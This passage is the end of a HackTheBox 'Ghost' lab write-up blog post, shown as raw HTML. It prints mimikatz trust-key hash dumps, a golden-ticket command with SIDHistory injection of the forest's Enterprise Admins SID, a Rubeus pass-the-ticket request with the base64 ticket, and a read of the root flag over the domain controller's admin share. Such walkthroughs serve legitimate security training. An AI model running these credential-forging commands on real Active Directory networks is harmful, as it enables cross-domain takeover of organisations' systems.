<span class="number">9</span>d <span class="number">5</span>b d5 <span class="number">0</span>f <span class="number">6</span>c <span class="number">38</span> <span class="number">33</span> <span class="number">25</span> <span class="number">1</span>a bd <span class="number">2</span>b <span class="number">3</span>e <span class="number">8</span>c <span class="number">84</span> ff <span class="number">98</span> <span class="number">41</span> <span class="number">56</span> <span class="number">84</span> <span class="number">05</span> cf <span class="number">01</span> bc ec bd a8 f0 f1 <span class="number">4</span>e <span class="number">82</span> <span class="number">4</span>a <span class="number">4</span>c f3 <span class="number">0</span>b <span class="number">36</span> <span class="number">15</span> <span class="number">04</span> <span class="number">72</span> <span class="number">80</span> <span class="number">43</span> <span class="number">7</span>e f3 d9 f2 eb <span class="number">33</span> aa ae f4 ae be e3 <span class="number">4</span>a e5 <span class="number">23</span> f2 <span class="number">5</span>e <span class="number">75</span> <span class="number">7</span>e <span class="number">7</span>b <span class="number">89</span> ee <span class="number">6</span>c a8 <span class="number">59</span> da <span class="number">2</span>d <span class="number">4</span>a <span class="number">31</span> f2 e9 <span class="number">57</span> fe <span class="number">24</span> <span class="number">13</span> e6 ed c4 <span class="number">51</span> <span class="number">05</span> <span class="built_in">cd</span> af b1 df <span class="number">3</span>e fd d1 e9 <span class="built_in">ac</span> <span class="number">4</span>c <span class="number">77</span> eb <span class="number">7</span>a <span class="number">94</span> <span class="number">34</span> f9 fa <span class="number">21</span> e8 ec <span class="number">5</span>e <span class="number">0</span>d fb e3 c6 ab <span class="number">44</span> <span class="number">4</span>f <span class="number">1</span>d cf <span class="number">1</span>e ee a9 e3 <span class="number">92</span> c8 <span class="number">3</span>b <span class="number">67</span> a2 aa <span class="number">77</span> b1 af <span class="number">5</span>f <span class="number">4</span>b <span class="number">04</span> <span class="number">61</span> <span class="number">86</span> <span class="number">1</span>e <span class="number">3</span>a <span class="number">60</span> ff <span class="number">94</span> ef <span class="number">89</span> <span class="number">6</span>b a2 <span class="number">45</span> a2 <span class="number">9</span>c ca db <span class="number">1</span>b <span class="number">38</span> <span class="number">8</span>a <span class="number">5</span>f ce f8 <span class="number">0</span>f a1 <span class="number">5</span>e <span class="number">4</span>e <span class="number">21</span> f9 <span class="number">7</span>a c9 e6 <span class="number">76</span> <span class="number">75</span> f0 e3 <span class="number">66</span> </span><br><span class="line">        * aes256_hmac       c1a816225b6e618e302b706945dd36c0ff57ed74344dc934d7445818e381b2eb</span><br><span class="line">        * aes128_hmac       <span class="number">07</span>b599b214cd961bdc9d9184796e7842</span><br><span class="line">        * rc4_hmac_nt       <span class="number">97</span>cf971f2c9e3886b338d3712f058a31</span><br><span class="line"></span><br><span class="line"> [ <span class="type">In</span>-<span class="number">1</span>] CORP.GHOST.HTB -&gt; GHOST.HTB</span><br><span class="line">    * <span class="number">7</span>/<span class="number">22</span>/<span class="number">2024</span> <span class="number">9</span>:<span class="number">21</span>:<span class="number">26</span> AM - <span class="built_in">CLEAR</span>   - de <span class="number">0</span>b <span class="number">64</span> <span class="number">63</span> <span class="number">58</span> <span class="number">9</span>d ed e1 bc <span class="number">36</span> c0 <span class="number">50</span> <span class="number">7</span>c <span class="number">4</span>d <span class="number">41</span> <span class="number">6</span>d bd <span class="number">82</span> <span class="number">72</span> e9 <span class="number">98</span> <span class="number">9</span>b <span class="number">13</span> <span class="number">58</span> b8 <span class="number">68</span> f1 <span class="number">94</span> <span class="number">8</span>c ca <span class="number">12</span> <span class="number">50</span> <span class="number">9</span>b af <span class="number">45</span> <span class="number">7</span>d <span class="number">0</span>a <span class="number">4</span>d <span class="number">4</span>e <span class="number">40</span> e2 <span class="number">7</span>d <span class="number">12</span> <span class="number">59</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">87</span> <span class="number">22</span> <span class="number">64</span> c8 fa b2 <span class="number">96</span> <span class="number">8</span>d aa c1 f1 <span class="number">17</span> a3 e7 aa <span class="number">2</span>b ec <span class="number">87</span> b5 <span class="number">59</span> <span class="number">57</span> <span class="number">71</span> <span class="number">6</span>f <span class="number">33</span> <span class="number">87</span> <span class="number">4</span>c e0 <span class="number">8</span>a <span class="number">8</span>b <span class="number">03</span> <span class="number">38</span> a2 <span class="number">71</span> b6 d5 <span class="number">0</span>b <span class="number">61</span> fd <span class="number">7</span>e <span class="number">14</span> <span class="number">3</span>e <span class="number">46</span> <span class="number">16</span> d9 <span class="number">29</span> d8 f6 f9 <span class="number">05</span> <span class="number">69</span> <span class="number">3</span>f b7 <span class="number">4</span>f c1 <span class="number">28</span> <span class="number">0</span>b <span class="number">7</span>e ec e5 <span class="number">46</span> ab <span class="number">7</span>e e8 <span class="number">2</span>c <span class="number">8</span>b be <span class="number">70</span> b5 d9 <span class="number">6</span>c <span class="number">96</span> <span class="number">1</span>b fb <span class="number">56</span> <span class="number">33</span> bc <span class="number">41</span> <span class="number">15</span> b5 <span class="number">73</span> <span class="number">42</span> <span class="number">25</span> <span class="number">54</span> <span class="number">15</span> <span class="number">4</span>b b6 <span class="built_in">fc</span> <span class="number">55</span> <span class="number">07</span> <span class="number">81</span> <span class="number">60</span> <span class="number">4</span>a <span class="number">6</span>b <span class="number">4</span>c <span class="number">22</span> a2 <span class="number">55</span> <span class="number">61</span> e5 <span class="number">91</span> e6 <span class="number">75</span> e3 <span class="number">62</span> d4 <span class="number">9</span>a <span class="number">37</span> <span class="number">77</span> bd <span class="number">63</span> <span class="number">90</span> <span class="number">8</span>e <span class="number">6</span>a <span class="number">2</span>a <span class="number">2</span>c c6 <span class="number">88</span> <span class="number">8</span>f <span class="number">57</span> <span class="number">44</span> <span class="number">7</span>a <span class="number">9</span>e <span class="number">35</span> aa e5 <span class="number">6</span>a <span class="number">2</span>b <span class="number">5</span>f c8 <span class="number">0</span>a <span class="number">8</span>c <span class="number">4</span>f cb bd af c9 <span class="number">60</span> <span class="number">59</span> ff <span class="number">15</span> d9 fd cf <span class="number">27</span> <span class="number">93</span> <span class="number">9</span>f f7 <span class="number">19</span> <span class="number">9</span>e <span class="number">91</span> <span class="number">2</span>b <span class="number">38</span> d7 <span class="number">0</span>e ec c9 <span class="number">43</span> e6 <span class="number">8</span>c <span class="number">3</span>b <span class="number">60</span> <span class="number">02</span> <span class="number">5</span>f b7 c3 c1 <span class="number">67</span> c2 <span class="number">6</span>b <span class="number">44</span> db <span class="number">1</span>f <span class="number">9</span>c f7 <span class="number">72</span> <span class="number">2</span>f <span class="number">3</span>a <span class="number">54</span> <span class="number">6</span>e <span class="number">62</span> <span class="number">02</span> c9 <span class="number">46</span> d1 b7 <span class="number">3</span>d <span class="number">26</span> <span class="number">54</span> d0 <span class="number">4</span>f <span class="number">35</span> <span class="number">65</span> a8 <span class="number">3</span>f </span><br><span class="line">        * aes256_hmac       de2e49c70945c0cb0dec99c93587de84f0b048843b8e295c6da720ba85545ffe</span><br><span class="line">        * aes128_hmac       b55ca148bc95f95b8cb72f67661e1a08</span><br><span class="line">        * rc4_hmac_nt       <span class="number">0</span>b0124f5d6c07ad530d6bf6a6404fdaa</span><br><span class="line"></span><br><span class="line"> [<span class="built_in">Out-1</span>] GHOST.HTB -&gt; CORP.GHOST.HTB</span><br><span class="line">    * <span class="number">4</span>/<span class="number">3</span>/<span class="number">2025</span> <span class="number">7</span>:<span class="number">46</span>:<span class="number">54</span> AM - <span class="built_in">CLEAR</span>   - <span class="number">78</span> <span class="number">10</span> <span class="number">13</span> <span class="number">24</span> <span class="number">91</span> <span class="number">0</span>a <span class="number">57</span> <span class="number">22</span> <span class="number">71</span> <span class="number">4</span>e f6 ef <span class="number">53</span> <span class="number">6</span>a d8 <span class="number">54</span> <span class="number">02</span> <span class="number">97</span> <span class="number">63</span> <span class="number">0</span>b <span class="number">78</span> <span class="number">28</span> <span class="number">41</span> b7 <span class="number">5</span>e <span class="number">5</span>e e6 b7 <span class="number">50</span> <span class="number">03</span> <span class="number">35</span> <span class="number">96</span> f2 e5 <span class="number">8</span>b a3 c1 <span class="number">21</span> fa f6 <span class="number">01</span> f5 <span class="number">5</span>f <span class="number">7</span>b <span class="number">38</span> <span class="number">98</span> bc <span class="number">8</span>b <span class="number">2</span>b f5 <span class="number">3</span>e <span class="number">91</span> ce <span class="number">8</span>a <span class="number">01</span> <span class="number">06</span> <span class="number">59</span> c0 <span class="number">9</span>b <span class="number">19</span> <span class="number">8</span>c d8 d3 <span class="number">1</span>a <span class="number">17</span> <span class="number">9</span>f d4 f1 b2 cb a0 <span class="number">49</span> f6 <span class="number">7</span>f <span class="number">97</span> f7 a0 <span class="number">79</span> <span class="number">63</span> bb <span class="number">20</span> <span class="number">4</span>a bf a3 d9 dd b1 <span class="number">13</span> <span class="number">20</span> c6 a0 <span class="number">84</span> a2 ea <span class="number">65</span> <span class="number">79</span> <span class="number">6</span>a b6 d3 db <span class="number">17</span> e9 be b8 c1 <span class="number">35</span> <span class="number">57</span> <span class="number">38</span> c8 <span class="number">3</span>b a6 <span class="number">6</span>a <span class="number">90</span> <span class="number">32</span> <span class="number">66</span> ba <span class="number">0</span>e bd fd <span class="number">67</span> bf f4 e9 <span class="number">3</span>c f2 e5 <span class="number">37</span> <span class="number">94</span> <span class="number">84</span> d6 c0 <span class="number">71</span> d3 <span class="number">42</span> <span class="number">85</span> ef <span class="number">4</span>e <span class="number">94</span> <span class="built_in">ac</span> <span class="number">56</span> <span class="number">0</span>f df <span class="number">05</span> <span class="number">77</span> <span class="number">1</span>b <span class="number">74</span> <span class="number">57</span> <span class="number">4</span>f a2 <span class="number">07</span> <span class="number">07</span> a1 d6 <span class="number">8</span>e ee a1 <span class="built_in">cd</span> <span class="number">6</span>a c0 <span class="number">4</span>c d9 <span class="number">3</span>f <span class="number">16</span> <span class="number">0</span>a fa <span class="number">47</span> <span class="number">07</span> <span class="number">45</span> <span class="number">45</span> ad b5 <span class="number">6</span>d e4 <span class="number">01</span> b1 e4 bf <span class="number">76</span> c2 <span class="number">8</span>e <span class="number">5</span>b <span class="number">4</span>e f4 <span class="number">04</span> ed <span class="number">08</span> e4 e0 <span class="number">7</span>e d8 <span class="number">18</span> <span class="number">5</span>a f5 df <span class="number">07</span> c3 <span class="number">97</span> <span class="number">3</span>d <span class="number">7</span>e <span class="number">6</span>d <span class="number">28</span> <span class="number">1</span>e c1 <span class="number">1</span>a ec <span class="number">6</span>d <span class="number">06</span> <span class="number">83</span> <span class="number">0</span>f <span class="number">27</span> ea c8 <span class="number">00</span> af <span class="number">92</span> c9 <span class="number">1</span>f f6 <span class="number">50</span> <span class="number">45</span> f5 c1 bb <span class="number">4</span>a <span class="number">09</span> bb d6 df <span class="number">6</span>b cf d6 fe fe d8 <span class="number">44</span> bb <span class="number">19</span> <span class="number">90</span> <span class="number">46</span> <span class="number">0</span>b </span><br><span class="line">        * aes256_hmac       b50449e019e0a55f9227fb2e830b044e9e9ad9952e2249e5de29f2027cd8f40d</span><br><span class="line">        * aes128_hmac       <span class="number">81</span>f4c2f21a640eed29861d71a619b4bb</span><br><span class="line">        * rc4_hmac_nt       ea4e9954536eb29091fc96bbce83be23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now we should have all we need. </p>
<h5 id="SIDHistory-Spoofing"><a href="#SIDHistory-Spoofing" class="headerlink" title="SIDHistory Spoofing"></a>SIDHistory Spoofing</h5><p>Next step is to get the SIDs of both domain:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; wmic useraccount get name,sid</span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line">Name                  SID                                            </span><br><span class="line">Administrator         S<span class="literal">-1-5-21-2034262909-2733679486-179904498-500</span>   </span><br><span class="line">Guest                 S<span class="literal">-1-5-21-2034262909-2733679486-179904498-501</span>   </span><br><span class="line">krbtgt                S<span class="literal">-1-5-21-2034262909-2733679486-179904498-502</span>   </span><br><span class="line">Administrator         S<span class="literal">-1-5-21-4084500788-938703357-3654145966-500</span>   </span><br><span class="line">Guest                 S<span class="literal">-1-5-21-4084500788-938703357-3654145966-501</span>   </span><br><span class="line">krbtgt                S<span class="literal">-1-5-21-4084500788-938703357-3654145966-502</span>   </span><br><span class="line">kathryn.holland       S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3602</span>  </span><br><span class="line">cassandra.shelton     S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3603</span>  </span><br><span class="line">robert.steeves        S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3604</span>  </span><br><span class="line">florence.ramirez      S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3606</span>  </span><br><span class="line">justin.bradley        S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3607</span>  </span><br><span class="line">arthur.boyd           S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3608</span>  </span><br><span class="line">beth.clark            S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3610</span>  </span><br><span class="line">charles.gray          S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3611</span>  </span><br><span class="line">jason.taylor          S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3612</span>  </span><br><span class="line">intranet_principal    S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3614</span>  </span><br><span class="line">gitea_temp_principal  S<span class="literal">-1-5-21-4084500788-938703357-3654145966-3615</span> </span><br></pre></td></tr></table></figure></div>

<p>And we can also get the SID of the <code>CORP.GHOST.HTB</code> from BloodHound:<code>S-1-5-21-2034262909-2733679486-179904498</code></p>
<p>Now what we can do is perform a Golden Ticket attack using mimikatz:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; .\mimi.exe <span class="string">&quot;kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498-502 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:61f02da833df265bbc885f02b950daa2 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi&quot;</span> <span class="keyword">exit</span></span><br><span class="line">.\mimi.exe <span class="string">&quot;kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498-502 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:61f02da833df265bbc885f02b950daa2 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498-502 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:61f02da833df265bbc885f02b950daa2 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi</span></span><br><span class="line">User      : Administrator</span><br><span class="line">Domain    : CORP.GHOST.HTB (CORP)</span><br><span class="line">SID       : S<span class="literal">-1-5-21-2034262909-2733679486-179904498-502</span></span><br><span class="line">User Id   : <span class="number">500</span></span><br><span class="line">Groups Id : *<span class="number">513</span> <span class="number">512</span> <span class="number">520</span> <span class="number">518</span> <span class="number">519</span> </span><br><span class="line">Extra SIDs: S<span class="literal">-1-5-21-4084500788-938703357-3654145966-519</span> ; </span><br><span class="line">ServiceKey: <span class="number">61</span>f02da833df265bbc885f02b950daa2 - rc4_hmac_nt      </span><br><span class="line">Service   : krbtgt</span><br><span class="line">Target    : GHOST.HTB</span><br><span class="line">Lifetime  : <span class="number">4</span>/<span class="number">4</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">24</span>:<span class="number">41</span> AM ; <span class="number">4</span>/<span class="number">2</span>/<span class="number">2035</span> <span class="number">3</span>:<span class="number">24</span>:<span class="number">41</span> AM ; <span class="number">4</span>/<span class="number">2</span>/<span class="number">2035</span> <span class="number">3</span>:<span class="number">24</span>:<span class="number">41</span> AM</span><br><span class="line">-&gt; Ticket : golden.kirbi</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Final Ticket Saved to file !</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now we can use that ticket to request access to the CIFS (file system) service on the new domain using Rubeus :</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; .\Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt</span><br><span class="line">.\Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.1</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGS</span><br><span class="line"></span><br><span class="line">[*] Requesting default etypes (RC4_HMAC, AES[<span class="number">128</span>/<span class="number">256</span>]_CTS_HMAC_SHA1) <span class="keyword">for</span> the service ticket</span><br><span class="line">[*] Building TGS<span class="literal">-REQ</span> request <span class="keyword">for</span>: <span class="string">&#x27;CIFS/dc01.ghost.htb&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dc01.ghost.htb (10.0.0.254)</span><br><span class="line">[+] TGS request successful!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFajCCBWagAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoQsbCUdIT1NULkhUQqIhMB+gAwIBAqEYMBYbBENJRlMbDmRjMDEuZ2hvc3QuaHRio4IEJjCCBCKgAwIBEqEDAgEEooIEFASCBBAfmBVyZplulQ+JK/AFbeGjXRlnfZg9DrIYovTDG2imZXJyGI1krygi1vSLWaldh4hcRBbOqto8IINPgYgG67CBd1YT2zWCgJsaELj7+X36BCALdrJg1CCwmw47Xy2KTdyF87TcJNjGypbpBvJOZWIOoRy5KXo6sh0Fd9yH/aOaofNOj5Q71IbIkYdjmTXmpYUhMf9pF/+igtoGTTTVgpiN74AKyI8k8TrwULa+K+mpeQl8I0Uy5inZUZy32IQdsmPMz9N87uZb7YT6eg0TMxO/OD+Xjipt4ZANd/p72D19Zmc6ZUaPSWyM5TaEVytLfKY0/lixC6SxvGAQGGFyRqNVvbVfxULYGe9aEfzlz6Aq4KP2fc5NnK/S7p89QxsrupYqGt2gLySSkRqJxCCgwt75DEDax85iaBbJFi4rvDtebjL+/EU9f3ZwbLvqF4bhMPjTBtfvp/SqLAVyo2PqKMhrJGpoLr9kWm7+XwO1oyn/E01v4AYN5rJf988mve4fntdalzOxSQR5cCPO8Zx9tRDIYRLVsP1lvXZ8QfoJBz0YWwQv2pSqNVEY4A3TCVc+VEmNKR0JlUW4LK5S6nEgtB3wrDMITeXUR4sQRhX3/P+pAPegILVNVtNsTTPRtf5Pn8waiofqKQEK83984gJVyt+xZv4f1uhgjj7HnPfuew6fD7SF9VCUKmjnLay47Yy7W+chEAG5C274Xkv7P+U++NhL7Mgm0NbRHoBjM87/on4AI4EccD+<span class="number">1</span>Xt/SvdbVWusBDDnPeNlWy51TUGVDT6TBkDwYC0ad824kIgBHq1amT27ON+rWgQW9nfXP0sNkz3MfXAx9YLeG1d6B11OCTHdUVVjsc2zx6NU4gimQHGxvXUo1VWMx/+Cnou+lTGSuC9PzWyW+VEMgq2QJdeUAhWjPag/UFhhLaP52HRNSaKz5fX9Cm7mvgHDDYrLORA5rxweVjnpa9fXzsb+f2nvBFnJbhgnYP/+oZ+L08pgbOcOipd0k5DfoRTP03+<span class="number">2</span>nmRs9ctjsearNqhq0DQKJNLawIJ9Xe14RxOoRFB8tl0xUJbeAMGrOG+<span class="number">13</span>yscM4MKyuZqa02RURbDIoOVqlAujO2voy6Yqxqbm9dZBYQIKE+ioGiOIwDQ9fk1QMSKWvG5ySqk2Tq9gHzf5eFz0NNp9mPZDOqrJVAjCfP0GV0throJjuB4hI4ag7s5BXyF6oLpKx3ysME/hxvQen+ap2EEfpqEKYzlnpWorwq+ARTjGT2jmx3y83bROZRa66Uzzg12RRMP83eX9jlyQq9P+x2RB5lbmdvWl/NvpsB4CKfdFYomGIHHVUNjyvKWtiYHDKuFzc8RFSlkcDJQ4vAcgaCdZonTvt0QAdVhbWC8iqekFH0aIGi0lmAeX2qOB6jCB56ADAgEAooHfBIHcfYHZMIHWoIHTMIHQMIHNoCswKaADAgESoSIEICt1CHiBMx8wt5i/NBi207Oj1SeO9oP8sypcsuL3g7OxoRAbDkNPUlAuR0hPU1QuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDI1MDQwNDEwMjUwMVqmERgPMjAyNTA0MDQyMDI1MDFapxEYDzIwMjUwNDExMTAyNTAxWqgLGwlHSE9TVC5IVEKpITAfoAMCAQKhGDAWGwRDSUZTGw5kYzAxLmdob3N0Lmh0Yg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  CIFS/dc01.ghost.htb</span><br><span class="line">  ServiceRealm             :  GHOST.HTB</span><br><span class="line">  UserName                 :  Administrator</span><br><span class="line">  UserRealm                :  CORP.GHOST.HTB</span><br><span class="line">  StartTime                :  <span class="number">4</span>/<span class="number">4</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">25</span>:<span class="number">01</span> AM</span><br><span class="line">  EndTime                  :  <span class="number">4</span>/<span class="number">4</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">25</span>:<span class="number">01</span> PM</span><br><span class="line">  RenewTill                :  <span class="number">4</span>/<span class="number">11</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">25</span>:<span class="number">01</span> AM</span><br><span class="line">  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  K3UIeIEzHzC3mL80GLbTs6PVJ472g/yzKlyy4veDs7E=</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>And now we can claim our root flag:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; <span class="built_in">type</span> \\DC01.ghost.htb\c<span class="variable">$</span>\users\administrator\desktop\root.txt</span><br><span class="line"><span class="built_in">type</span> \\DC01.ghost.htb\c<span class="variable">$</span>\users\administrator\desktop\root.txt</span><br><span class="line">d74463e00bbe6318b1fc2b3573a3c6e4</span><br><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt;</span><br></pre></td></tr></table></figure></div>

<p>That was it for Ghost, hope you learned something new!<br>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: Ghost</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-04-03 15:29:40</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-04-05 10:44:31
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/04/03/Hackthebox-Ghost/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/04/11/Hackthebox-LinkVortex/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: LinkVortex</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/03/27/Hackthebox-BlockBlock/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: BlockBlock</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: Ghost</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-intranet-ghost-htb-8008"><span class="nav-text">Web Application - http:&#x2F;&#x2F;intranet.ghost.htb:8008&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-gitea-ghost-htb-8008"><span class="nav-text">Web Application - http:&#x2F;&#x2F;gitea.ghost.htb:8008 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gitea-Blog-project-Local-File-Inclusion"><span class="nav-text">Gitea Blog project - Local File Inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gitea-Intranet-Project-X-DEV-INTRANET-KEY"><span class="nav-text">Gitea Intranet Project - X-DEV-INTRANET-KEY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chaining-Local-File-Inclusion-to-get-RCE"><span class="nav-text">Chaining Local File Inclusion to get 